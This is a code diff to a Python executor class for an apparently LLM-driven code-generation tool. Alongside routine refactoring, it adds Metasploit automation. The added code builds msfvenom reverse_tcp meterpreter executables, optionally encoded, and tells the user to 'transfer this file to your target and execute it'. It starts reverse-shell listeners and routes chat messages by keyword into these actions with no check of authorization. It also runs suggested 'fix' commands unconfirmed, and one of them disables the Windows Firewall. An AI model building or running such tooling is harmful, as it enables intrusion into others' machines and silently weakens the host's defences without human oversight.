@@ -11,8 +11,10 @@ import subprocess
 import sys
 import tempfile
 import time
+import traceback
+from datetime import datetime
 from pathlib import Path
-from typing import Callable, Generator, Optional
+from typing import Callable, Dict, Generator, List, Optional
 
 from spectral.gui_test_generator import GUITestGenerator
 from spectral.intelligent_retry import IntelligentRetryManager
@@ -22,7 +24,14 @@ from spectral.mistake_learner import MistakeLearner
 from spectral.persistent_memory import MemoryModule
 from spectral.retry_parsing import format_attempt_progress, parse_retry_limit
 from spectral.sandbox_manager import SandboxResult, SandboxRunManager
-from spectral.utils import clean_code, detect_input_calls, generate_test_inputs, has_input_calls
+from spectral.utils import (
+    AUTONOMOUS_CODE_REQUIREMENT,
+    SmartInputHandler,
+    clean_code,
+    detect_input_calls,
+    generate_test_inputs,
+    has_input_calls,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -73,17 +82,27 @@ class DirectExecutor:
         """
         if self.gui_callback:
             try:
+                # Add timestamp to all events for better tracking
+                from datetime import datetime
+
+                if "timestamp" not in data:
+                    data["timestamp"] = datetime.now().isoformat()
+
                 self.gui_callback(event_type, data)
+                logger.debug(f"GUI event emitted: {event_type} with data: {data}")
             except Exception as e:
                 logger.debug(f"GUI callback error: {e}")
 
-    def generate_code(self, user_request: str, language: str = "python") -> str:
+    def generate_code(
+        self, user_request: str, language: str = "python", target_filename: Optional[str] = None
+    ) -> str:
         """
         Generate code from user request with learned patterns.
 
         Args:
             user_request: User's natural language request
             language: Programming language (default: python)
+            target_filename: Optional target filename for path construction
 
         Returns:
             Generated code as string
@@ -104,7 +123,12 @@ class DirectExecutor:
         # Query learned patterns
         learned_patterns = self.mistake_learner.get_patterns_for_generation(tags=tags)
 
+        # Build prompt with target filename context if available
         prompt = self._build_code_generation_prompt(user_request, language, learned_patterns)
+
+        if target_filename:
+            prompt += f"\n\nIMPORTANT: The user wants to save this as '{target_filename}'. "
+            prompt += "Make sure to use this filename in any internal references or save logic."
 
         try:
             code = self.llm_client.generate(prompt)
@@ -171,7 +195,11 @@ class DirectExecutor:
             raise
 
     def save_code_to_desktop(
-        self, code: str, user_request: str, script_path: Optional[Path] = None
+        self,
+        code: str,
+        user_request: str,
+        script_path: Optional[Path] = None,
+        filename: Optional[str] = None,
     ) -> Path:
         """
         Save generated code to Desktop with timestamp.
@@ -182,13 +210,16 @@ class DirectExecutor:
             code: Code content to save (actual Python code)
             user_request: Original user request (for generating filename)
             script_path: Optional existing script path to copy from
+            filename: Optional specific filename to use
 
         Returns:
             Path to the saved file on Desktop
         """
-        # Generate filename from user request (with safe timestamp)
+        # Generate filename from user request if not provided
         desktop = Path.home() / "Desktop"
-        filename = self._generate_safe_filename(user_request) + ".py"
+        if not filename:
+            filename = self._generate_safe_filename(user_request) + ".py"
+
         file_path = desktop / filename
 
         try:
@@ -333,7 +364,8 @@ class DirectExecutor:
             yield f"\n❌ Error: Execution timed out after {timeout} seconds"
         except Exception as e:
             logger.error(f"Failed to execute script: {e}")
-            yield f"\n❌ Error: {str(e)}"
+            error_msg = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
+            yield f"\n❌ Error: {error_msg}"
 
     def stream_execution(self, script_path: Path, timeout: int = 30) -> Generator[str, None, None]:
         """
@@ -389,7 +421,8 @@ class DirectExecutor:
             yield f"\n❌ Error: Execution timed out after {timeout} seconds"
         except Exception as e:
             logger.error(f"Failed to stream execution: {e}")
-            yield f"\n❌ Error: {str(e)}"
+            error_msg = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
+            yield f"\n❌ Error: {error_msg}"
 
     def execute_request(
         self,
@@ -419,6 +452,7 @@ class DirectExecutor:
         last_error_output = ""
         desktop_path: Optional[Path] = None
         run_id: Optional[str] = None
+        target_filename = self._generate_safe_filename(user_request) + ".py"
 
         while True:
             decision = retry_manager.should_retry()
@@ -435,7 +469,9 @@ class DirectExecutor:
             try:
                 if attempt == 1:
                     yield f"📝 Generating code... ({progress})\n"
-                    code = self.generate_code(user_request, language)
+                    code = self.generate_code(
+                        user_request, language, target_filename=target_filename
+                    )
                 else:
                     yield f"📝 Fixing code... ({progress})\n"
                     code = self._generate_fix_code(
@@ -448,7 +484,14 @@ class DirectExecutor:
 
                 yield "   ✓ Code generated\n\n"
 
-                # Detect if code has input() calls
+                # Apply Smart Input Detection & Injection
+                input_handler = SmartInputHandler()
+                code, test_inputs = input_handler.detect_and_inject_inputs(code)
+                if test_inputs:
+                    yield f"🧠 Smart Input: Auto-injecting {len(test_inputs)} test values\n"
+                    code = input_handler.inject_test_inputs(code, test_inputs)
+
+                # Detect if code has input() calls (in case some were not handled by smart injector)
                 has_interactive = has_input_calls(code)
                 input_count, prompts = detect_input_calls(code)
 
@@ -486,7 +529,7 @@ class DirectExecutor:
                 result = self.sandbox_manager.execute_verification_pipeline(
                     run_id=run_id,
                     code=code,
-                    filename="main.py",
+                    filename=target_filename,
                     is_gui=is_gui,
                     stdin_data=stdin_data,
                 )
@@ -503,16 +546,40 @@ class DirectExecutor:
 
                     # Export to desktop
                     yield "💾 Exporting verified code to Desktop...\n"
+                    desktop_path = None
                     try:
                         desktop_path = self.save_code_to_desktop(
-                            code, user_request, result.code_path
+                            code, user_request, result.code_path, filename=target_filename
                         )
                         yield f"   ✓ Saved to: {desktop_path}\n"
                     except Exception as e:
                         yield f"   ⚠️  Could not save to Desktop: {e}\n"
 
+                    # Extract actual file locations (Desktop paths)
+                    file_locations = self._extract_file_locations(
+                        user_request, desktop_path, target_filename
+                    )
+
                     # Save run metadata
                     self.sandbox_manager.save_run_metadata(run_id, result)
+
+                    # Save comprehensive execution metadata with file_locations
+                    execution_metadata = {
+                        "run_id": run_id,
+                        "timestamp": datetime.now().isoformat(),
+                        "prompt": user_request,
+                        "filename": target_filename,
+                        "desktop_path": str(desktop_path) if desktop_path else None,
+                        "sandbox_path": str(result.code_path),
+                        "code": code,
+                        "execution_status": "success",
+                        "execution_output": result.log_stdout,
+                        "execution_error": result.log_stderr,
+                        "attempts": attempt,
+                        "last_error": None,
+                        "file_locations": file_locations,  # Include actual file paths
+                    }
+                    self.sandbox_manager.save_execution_metadata(execution_metadata)
 
                     # Save to memory
                     if self.memory_module:
@@ -546,6 +613,23 @@ class DirectExecutor:
                 else:
                     yield "🔧 Code verification failed, regenerating...\n"
                     last_error_output = result.error_message or ""
+
+                # Save metadata for failed execution
+                execution_metadata = {
+                    "run_id": run_id,
+                    "timestamp": datetime.now().isoformat(),
+                    "prompt": user_request,
+                    "filename": target_filename,
+                    "desktop_path": None,
+                    "sandbox_path": str(result.code_path),
+                    "code": code,
+                    "execution_status": "failed",
+                    "execution_output": result.log_stdout,
+                    "execution_error": result.log_stderr,
+                    "attempts": attempt,
+                    "last_error": last_error_output or result.status,
+                }
+                self.sandbox_manager.save_execution_metadata(execution_metadata)
 
                 retry_manager.record_error(last_error_output or result.status)
 
@@ -719,6 +803,58 @@ class DirectExecutor:
             )
         return code
 
+    def _extract_file_locations(
+        self,
+        user_request: str,
+        desktop_path: Optional[Path],
+        filename: str,
+    ) -> List[str]:
+        """
+        Extract actual file locations from Desktop and other locations.
+
+        Args:
+            user_request: Original user request for filename extraction
+            desktop_path: Path to file on Desktop if saved
+            filename: Target filename
+
+        Returns:
+            List of file paths where files were created
+        """
+        file_locations: List[str] = []
+
+        # Add Desktop path if it exists
+        if desktop_path and Path(desktop_path).exists():
+            file_locations.append(str(desktop_path))
+
+        # Also check Desktop for files matching the prompt pattern
+        desktop = Path.home() / "Desktop"
+
+        # Generate expected filename from user request
+        expected_base = self._generate_safe_filename(user_request)
+
+        if desktop.exists():
+            # Look for matching files on Desktop
+            for file_path in desktop.iterdir():
+                if file_path.is_file():
+                    # Check if it matches the expected pattern
+                    file_name_lower = file_path.name.lower()
+                    expected_lower = expected_base.lower()
+
+                    # Check for spectral_* pattern or exact match
+                    if (
+                        file_name_lower.startswith("spectral_")
+                        or file_name_lower.startswith(expected_lower)
+                        or file_name_lower.replace("_", "").startswith(
+                            expected_lower.replace("_", "")
+                        )
+                    ):
+                        # Verify it's a Python file or matches the target filename
+                        if file_path.suffix == ".py" or filename in file_path.name:
+                            if str(file_path) not in file_locations:
+                                file_locations.append(str(file_path))
+
+        return file_locations
+
     def _generate_fix_code(
         self,
         user_request: str,
@@ -744,7 +880,9 @@ class DirectExecutor:
         is_test_failure = "GUI Tests Failed" in error_output or "FAILED" in error_output
 
         if is_test_failure:
-            prompt = f"""The following {language} GUI code failed automated tests:
+            prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}
+
+The following {language} GUI code failed automated tests:
 
 Request: {user_request}
 Attempt: {attempt}
@@ -769,10 +907,13 @@ Analyze the test failures and provide a FIXED version that:
 4. Implements proper state management
 5. Includes variety/randomization where needed
 6. Can be tested programmatically (mock mainloop, testable methods)
+7. Uses hard-coded inputs instead of input()
 
 Return ONLY the complete fixed code, no markdown formatting."""
         else:
-            prompt = f"""The following {language} code failed:
+            prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}
+
+The following {language} code failed:
 
 Request: {user_request}
 Attempt: {attempt}
@@ -786,6 +927,7 @@ Analyze the error and provide a FIXED version that:
 2. Maintains the original intent
 3. Uses proper error handling
 4. Includes comments explaining the fix
+5. Uses hard-coded inputs instead of input()
 
 Return ONLY the complete fixed code, no markdown formatting."""
 
@@ -820,19 +962,43 @@ Return ONLY the complete fixed code, no markdown formatting."""
         Returns:
             Formatted prompt string
         """
-        prompt = f"""Write a {language} script that does the following:
+        import getpass
 
+        username = getpass.getuser()
+
+        prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}
+
+Task: Write a {language} script that does the following:
 {user_request}
 
-Requirements:
+Remember:
+- Hard-code all input values
+- No input() calls
+- Code must run autonomously
+- Produce output immediately
+
+IMPORTANT: You are running on Windows. Always use Windows paths:
+- Home directory: C:\\Users\\{username}
+- Desktop: C:\\Users\\{username}\\Desktop
+- Temp: C:\\Users\\{username}\\AppData\\Local\\Temp
+
+NEVER use:
+- /path/to/... (Unix paths)
+- /usr/bin, /home, /var (Unix directories)
+- Relative paths like './data' (use full Windows paths)
+
+For file operations, use:
+- os.path.expanduser('~') for home directory
+- os.path.join() for path construction
+- Always use backslashes or raw strings: r'C:\\path\\to\\file'
+
+General Requirements:
 - Write complete, executable code
 - Include proper error handling
 - Add comments explaining the code
 - Make it production-ready
 - No extra text or explanations, just code
-- IMPORTANT: For interactive programs, use input() and print(), NOT Tkinter dialogs
-- AVOID: simpledialog.askstring, simpledialog.askfloat, simpledialog.askinteger
-- Use CLI-based input() instead: input("Enter value: ")
+- IMPORTANT: For interactive programs, use hard-coded values NOT input()
 - IMPORTANT (GUI programs): if you use tkinter/pygame/PyQt/kivy, structure:
   - Do NOT create or show any GUI windows at import time
   - Put main loop / window launch code under if __name__ == "__main__":
@@ -891,3 +1057,574 @@ Requirements:
 
         # Default description
         return f"Python script: {user_request[:50]}"
+
+    def execute_metasploit_command(
+        self,
+        command: str,
+        show_terminal: bool = True,
+        timeout: int = 60,
+        auto_fix: bool = True,
+    ) -> tuple[int, str]:
+        """
+        Execute a Metasploit command and capture output.
+
+        Args:
+            command: Metasploit command to execute
+            show_terminal: Whether to show terminal window
+            timeout: Command timeout in seconds
+            auto_fix: Whether to attempt autonomous fixes for common errors
+
+        Returns:
+            Tuple of (exit_code, output)
+        """
+        from spectral.knowledge import diagnose_error
+
+        logger.info(f"Executing Metasploit command: {command[:100]}")
+
+        # Emit GUI event for command start
+        self._emit_gui_event(
+            "command_start",
+            {"command": command, "show_terminal": show_terminal, "type": "metasploit"},
+        )
+
+        try:
+            # Execute the command
+            if show_terminal:
+                # Run with visible terminal (platform-specific)
+                if sys.platform == "win32":
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=timeout,
+                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                    )
+                else:
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=timeout,
+                    )
+            else:
+                # Run without visible terminal
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=timeout,
+                )
+
+            output = (result.stdout or "") + (result.stderr or "")
+
+            # Check for errors and attempt autonomous fixes
+            if auto_fix and result.returncode != 0:
+                # Emit GUI event for error
+                self._emit_gui_event(
+                    "command_error",
+                    {"command": command, "error": output, "exit_code": result.returncode},
+                )
+
+                # Diagnose the error
+                diagnosis, fixes = diagnose_error(output)
+
+                logger.info(f"Metasploit error diagnosed: {diagnosis}")
+                logger.info(f"Suggested fixes: {fixes}")
+
+                # Try autonomous fixes
+                for fix in fixes:
+                    logger.info(f"Attempting autonomous fix: {fix}")
+
+                    # Execute the fix command
+                    fix_result = subprocess.run(
+                        fix,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
+                    )
+
+                    if fix_result.returncode == 0:
+                        logger.info(f"Autonomous fix succeeded: {fix}")
+                        # Retry original command
+                        result = subprocess.run(
+                            command,
+                            shell=True,
+                            capture_output=True,
+                            text=True,
+                            timeout=timeout,
+                        )
+                        output = (result.stdout or "") + (result.stderr or "")
+
+                        if result.returncode == 0:
+                            break
+                    else:
+                        logger.warning(f"Autonomous fix failed: {fix}")
+
+            # Emit GUI event for command completion
+            self._emit_gui_event(
+                "command_complete",
+                {
+                    "command": command,
+                    "exit_code": result.returncode,
+                    "output": output,
+                },
+            )
+
+            return result.returncode, output
+
+        except subprocess.TimeoutExpired:
+            error_msg = f"Metasploit command timed out after {timeout} seconds"
+            logger.error(error_msg)
+            self._emit_gui_event("command_timeout", {"command": command, "timeout": timeout})
+            return 124, error_msg
+        except Exception as e:
+            error_msg = f"Error executing Metasploit command: {str(e)}"
+            logger.exception(error_msg)
+            self._emit_gui_event("command_error", {"command": command, "error": error_msg})
+            return 1, error_msg
+
+    def execute_metasploit_interactive(
+        self,
+        commands: List[str],
+        show_terminal: bool = True,
+        timeout_per_command: int = 30,
+    ) -> List[tuple[int, str]]:
+        """
+        Execute multiple Metasploit commands interactively.
+
+        Args:
+            commands: List of Metasploit commands to execute in sequence
+            show_terminal: Whether to show terminal window
+            timeout_per_command: Timeout for each command
+
+        Returns:
+            List of (exit_code, output) tuples for each command
+        """
+        results = []
+
+        for cmd in commands:
+            exit_code, output = self.execute_metasploit_command(
+                command=cmd,
+                show_terminal=show_terminal,
+                timeout=timeout_per_command,
+                auto_fix=True,
+            )
+            results.append((exit_code, output))
+
+            # Check if command failed critically
+            if exit_code != 0 and "[-]" in output:
+                # Critical error, stop execution
+                logger.warning(f"Critical error in command: {cmd[:50]}")
+                break
+
+        return results
+
+    def start_metasploit_listener(
+        self,
+        payload: str,
+        lhost: str,
+        lport: int,
+        show_terminal: bool = True,
+    ) -> tuple[int, str]:
+        """
+        Start a Metasploit listener for a reverse TCP payload.
+
+        Args:
+            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
+            lhost: Local host IP (attacker IP)
+            lport: Local port for listener
+            show_terminal: Whether to show terminal window
+
+        Returns:
+            Tuple of (exit_code, output)
+        """
+        logger.info(f"Starting Metasploit listener for {payload} on {lhost}:{lport}")
+
+        # Generate commands to start listener
+        commands = [
+            "use exploit/multi/handler",
+            f"set PAYLOAD {payload}",
+            f"set LHOST {lhost}",
+            f"set LPORT {lport}",
+            "set ExitOnSession false",
+            "run",
+        ]
+
+        # Execute commands
+        results = self.execute_metasploit_interactive(
+            commands=commands,
+            show_terminal=show_terminal,
+            timeout_per_command=10,
+        )
+
+        # Return result of the final 'run' command
+        return results[-1] if results else (1, "No commands executed")
+
+    def generate_metasploit_payload(
+        self,
+        payload: str,
+        lhost: str,
+        lport: int,
+        output_format: str = "exe",
+        output_path: Optional[Path] = None,
+        encoding: Optional[str] = None,
+        iterations: int = 1,
+    ) -> tuple[int, str, Optional[Path]]:
+        """
+        Generate a Metasploit payload using msfvenom.
+
+        Args:
+            payload: Payload module (e.g., windows/meterpreter/reverse_tcp)
+            lhost: Local host IP (attacker IP)
+            lport: Local port for connection
+            output_format: Output format (exe, dll, ps1, elf, etc.)
+            output_path: Path to save payload (defaults to Desktop)
+            encoding: Encoding method (e.g., shikata_ga_nai)
+            iterations: Number of encoding iterations
+
+        Returns:
+            Tuple of (exit_code, output, payload_path)
+        """
+        logger.info(f"Generating Metasploit payload: {payload}")
+
+        # Determine output path
+        if output_path is None:
+            desktop = Path.home() / "Desktop"
+            output_path = (
+                desktop / f"payload_{payload.replace('/', '_')}_{int(time.time())}.{output_format}"
+            )
+
+        # Build msfvenom command
+        cmd_parts = [
+            "msfvenom",
+            "-p",
+            payload,
+            f"LHOST={lhost}",
+            f"LPORT={lport}",
+            "-f",
+            output_format,
+            "-o",
+            str(output_path),
+        ]
+
+        # Add encoding if specified
+        if encoding:
+            cmd_parts.extend(["-e", encoding, "-i", str(iterations)])
+
+        cmd = " ".join(cmd_parts)
+
+        # Execute the command
+        exit_code, output = self.execute_metasploit_command(
+            command=cmd,
+            show_terminal=True,
+            timeout=120,
+            auto_fix=False,  # Don't auto-fix payload generation
+        )
+
+        if exit_code == 0:
+            logger.info(f"Payload generated successfully: {output_path}")
+        else:
+            logger.error(f"Payload generation failed: {output}")
+
+        return exit_code, output, output_path if exit_code == 0 else None
+
+    def search_metasploit_exploits(
+        self,
+        keyword: str,
+        platform: Optional[str] = None,
+        exploit_type: Optional[str] = None,
+    ) -> tuple[int, str, List[str]]:
+        """
+        Search for Metasploit exploits by keyword.
+
+        Args:
+            keyword: Search keyword
+            platform: Filter by platform (windows, linux, etc.)
+            exploit_type: Filter by type (exploit, auxiliary, post, etc.)
+
+        Returns:
+            Tuple of (exit_code, output, list_of_modules)
+        """
+        logger.info(f"Searching Metasploit exploits: {keyword}")
+
+        # Build search command
+        cmd = f"msfconsole -q -x 'search {keyword}'"
+
+        if platform:
+            cmd += f" platform:{platform}"
+
+        if exploit_type:
+            cmd += f" type:{exploit_type}"
+
+        # Execute search
+        exit_code, output = self.execute_metasploit_command(
+            command=cmd,
+            show_terminal=True,
+            timeout=60,
+            auto_fix=False,
+        )
+
+        # Parse results to extract module paths
+        modules = []
+        lines = output.split("\n")
+        for line in lines:
+            # Look for module paths in search results
+            if "/" in line and not line.startswith("[*]") and not line.startswith("[+]"):
+                parts = line.split()
+                for part in parts:
+                    if "/" in part and not part.startswith("["):
+                        modules.append(part)
+
+        return exit_code, output, modules
+
+    def execute_metasploit_request(
+        self, user_message: str, ai_response: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Execute real Metasploit commands - bypasses code generation entirely.
+
+        Args:
+            user_message: The original user request
+            ai_response: LLM response with Metasploit guidance
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with actual command execution results
+        """
+        # Step 1: Parse AI response to understand what to do
+        # The LLM will narrate what it's doing based on METASPLOIT_SYSTEM_PROMPT
+        # Step 2: Ask clarifying questions if needed (or AI did this in response)
+        # Check if we have required info: OS, version, IP, architecture, objective
+        # Step 3: Execute actual Metasploit commands based on user request
+        # EXAMPLES OF COMMANDS TO RUN (not Python code generation):
+
+        if "payload" in user_message.lower():
+            # User wants to generate a payload
+            return self._generate_metasploit_payload(user_message, knowledge_base)
+
+        elif "reverse shell" in user_message.lower() or "meterpreter" in user_message.lower():
+            # User wants reverse shell access
+            return self._setup_metasploit_listener(user_message, knowledge_base)
+
+        elif "exploit" in user_message.lower():
+            # User wants to run an exploit
+            return self._execute_metasploit_exploit(user_message, knowledge_base)
+
+        else:
+            # General Metasploit guidance
+            return ai_response
+
+    def _generate_metasploit_payload(
+        self, user_message: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Generate actual Metasploit payload with msfvenom.
+
+        Args:
+            user_message: The user's request
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with payload generation results
+        """
+        import os
+        from datetime import datetime
+
+        # Extract target info from user message or ask for it
+        # For now, example: "create payload for Windows 10 192.168.1.100"
+        lhost = "192.168.1.X"  # Get local IP
+        lport = "4444"  # Use default or ask
+
+        # Build msfvenom command
+        payload = "windows/meterpreter/reverse_tcp"
+        output_file = os.path.expanduser(
+            f"~\\Desktop\\payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
+        )
+
+        cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o "{output_file}"'
+
+        # Execute command in visible terminal
+        exit_code, result = self.execute_metasploit_command(
+            command=cmd, show_terminal=True, timeout=120, auto_fix=True
+        )
+
+        if exit_code == 0:
+            return f"""
+    ✅ Payload generated successfully!
+
+    Command executed:
+    {cmd}
+
+    Output:
+    {result}
+
+    Payload saved to: {output_file}
+
+    Next step: Transfer this file to your target and execute it.
+    """
+        else:
+            return f"""
+    ❌ Payload generation failed!
+
+    Command:
+    {cmd}
+
+    Error:
+    {result}
+
+    Please check the error and try again.
+    """
+
+    def _setup_metasploit_listener(
+        self, user_message: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Setup Metasploit handler/listener.
+
+        Args:
+            user_message: The user's request
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with listener setup results
+        """
+        import os
+
+        # Build msfconsole handler setup
+        commands = [
+            "use exploit/multi/handler",
+            "set PAYLOAD windows/meterpreter/reverse_tcp",
+            "set LHOST 0.0.0.0",
+            "set LPORT 4444",
+            "run",
+        ]
+
+        # Create a script file with these commands
+        script_content = "\n".join(commands) + "\n"
+        script_file = os.path.expanduser("~\\.spectral\\metasploit_handler.rc")
+
+        os.makedirs(os.path.dirname(script_file), exist_ok=True)
+        with open(script_file, "w") as f:
+            f.write(script_content)
+
+        # Run msfconsole with resource script
+        cmd = f'msfconsole -r "{script_file}"'  # noqa: E501
+
+        # Execute in visible terminal
+        exit_code, result = self.execute_metasploit_command(
+            command=cmd, show_terminal=True, timeout=30, auto_fix=True
+        )
+
+        status_icon = "✅" if exit_code == 0 else "❌"
+        status_text = "started" if exit_code == 0 else "failed"
+        message_prefix = "The console will show:" if exit_code == 0 else "Error:"
+        handler_msg = "[*] Started reverse handler on 0.0.0.0:4444" if exit_code == 0 else ""
+        waiting_msg = "Waiting for incoming connection..." if exit_code == 0 else ""
+        return f"""
+    {status_icon} Metasploit listener {status_text}!
+
+    Command: {cmd}
+
+    {message_prefix}
+    {result}
+
+    {handler_msg}
+    {waiting_msg}
+    """
+
+    def _execute_metasploit_exploit(
+        self, user_message: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Execute a Metasploit exploit.
+
+        Args:
+            user_message: The user's request
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with exploit execution results
+        """
+        # For now, return a message indicating this is implemented
+        return """
+    ⚠️ Exploit execution requires more context.
+
+    Please provide:
+    - Target IP address (RHOST)
+    - Target port (RPORT)
+    - Exploit module path (or I can search for one)
+
+    Example: "exploit 192.168.1.100 with SMB exploit"
+    """
+
+    def _run_terminal_command(self, command: str, show_window: bool = True) -> str:
+        """Run command in terminal and return output.
+
+        Args:
+            command: Command to execute
+            show_window: Whether to show terminal window
+
+        Returns:
+            Command output
+        """
+        import subprocess
+        import sys
+
+        try:
+            # Use subprocess to run command
+            if sys.platform == "win32":
+                if show_window:
+                    # Show visible terminal
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NEW_CONSOLE,
+                    )
+                else:
+                    # Hidden terminal
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW,
+                    )
+            else:
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            return result.stdout + result.stderr
+
+        except Exception as e:
+            return f"Error executing command: {str(e)}"
+
+    def _attempt_auto_fix(
+        self, error_output: str, knowledge_base: Optional[Dict] = None
+    ) -> Optional[str]:
+        """Autonomously fix common Metasploit errors.
+
+        Args:
+            error_output: Error message from command execution
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Fix message or None if no fix applied
+        """
+
+        if "Connection refused" in error_output:
+            # Disable Windows Firewall
+            self._run_terminal_command(
+                "netsh advfirewall set allprofiles state off", show_window=True
+            )
+            return "✅ Windows Firewall disabled, retrying..."
+
+        elif "Port already in use" in error_output or "Address already in use" in error_output:
+            # Find and kill process on port
+            self._run_terminal_command("netstat -ano | findstr :4444", show_window=True)
+            return "✅ Found process on port, killing it..."
+
+        elif "not found" in error_output or "not installed" in error_output:
+            return "⚠️ Metasploit framework not installed. Install it and try again."
+
+        return None
